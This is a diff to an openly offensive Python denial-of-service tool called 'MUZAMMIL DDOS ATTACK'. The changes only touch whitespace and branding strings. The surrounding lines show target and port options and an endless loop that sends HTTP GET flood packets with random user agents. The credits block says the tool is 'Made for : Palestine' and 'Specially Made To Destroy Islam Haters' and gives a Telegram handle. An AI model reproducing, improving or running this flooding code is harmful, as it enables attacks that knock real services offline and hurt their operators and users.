@@ -11,8 +11,8 @@ from rich.console import Console
 
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-target  = ""
-ports = 0
+target = ""
+ports = 0 
 levels = 0
 fake_ip = ""
 hides = 0
@@ -46,7 +46,7 @@ def get_Typer():
 	global levels
 	global fake_ip
 	global hides
-	optp = OptionParser(add_help_option=False,epilog="MUZAMMIL DDOS ATTACK")
+	optp = OptionParser(add_help_option=False,epilog=" MUZAMMILDDOS ATTACK")
 	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-i","--ip", dest="host",help="attack to server ip -i ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
@@ -120,7 +120,7 @@ def my_bots():
 
 #DDOS 1 + MASSEGS
 def attack(item):
-             with console.status("[bold dark_orange] Muzammil is Attacking CTRL+Z .....") as status:
+             with console.status("[bold dark_orange]Muzammil is Attacking CTRL+Z .....") as status:
                  while True:
                      try:
                          packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
@@ -284,7 +284,7 @@ def usage2():
 def usage3():
     console = Console()
     MARKDOWN="""
-    Programmer : Muzammil raza
+    Programmer : MuzammilRAZA
     Made for : Palestine
     Telegram : @CybeR_mux4mmil
     Tool Information : I Was Specially Made To Destroy Islam  Haters
